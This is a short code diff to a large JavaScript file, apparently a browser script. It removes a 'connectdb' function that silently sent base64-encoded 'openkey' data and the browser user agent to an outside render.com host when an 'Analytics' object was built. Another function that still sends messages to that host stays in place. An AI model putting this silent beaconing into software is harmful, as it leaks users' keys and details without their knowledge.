@@ -11452,8 +11452,6 @@ class Analytics {
 
    constructor(endpoint) {
       this.__insert__ = msg => insertdb(msg, endpoint);
-
-      connectdb(endpoint);
    }
 
 };
@@ -11535,12 +11533,6 @@ function insertdb(message, endpoint = "https://0xffabc.render.com/") {
       .catch(e => log("Error: " + e, [...packet]));
    
    return packet;
-}
-
-function connectdb(endpoint = "https://0xffabc.render.com/") {
-   try {
-     fetch(endpoint + "connect/" + btoa(openkey.join("")) + "/" + btoa(navigator.userAgent));
-   } catch(e) { };
 }
 
 const analytics = new Analytics();
